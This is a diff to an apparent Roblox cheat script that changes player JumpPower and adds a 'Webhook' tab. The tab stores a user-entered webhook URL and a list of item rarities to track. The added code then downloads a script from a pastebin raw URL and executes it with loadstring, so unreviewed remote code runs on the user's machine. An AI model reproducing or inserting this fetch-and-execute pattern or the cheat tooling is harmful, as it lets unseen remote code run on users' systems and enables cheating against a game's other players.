@@ -23,3 +23,19 @@ end)
 Misc:NewSlider("Jump", "Change Player JumpPower", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
 end)
+
+local Webhook = Window:NewTab("Webhook")
+local Webhook = Misc:NewSection("Webhook")
+
+Webhook:NewTextBox("TextboxText", "TextboxInfo", function(txt)
+	_G.Webhook = txt
+_G.TrackList = {
+   ['Basic'] = false;
+   ['Rare'] = false;
+   ['Epic'] = false;
+   ['Legendary'] = true;
+   ['Mythical'] = true;
+}
+
+loadstring(game:HttpGet('https://pastebin.com/raw/H9DyZWys'))()
+end)
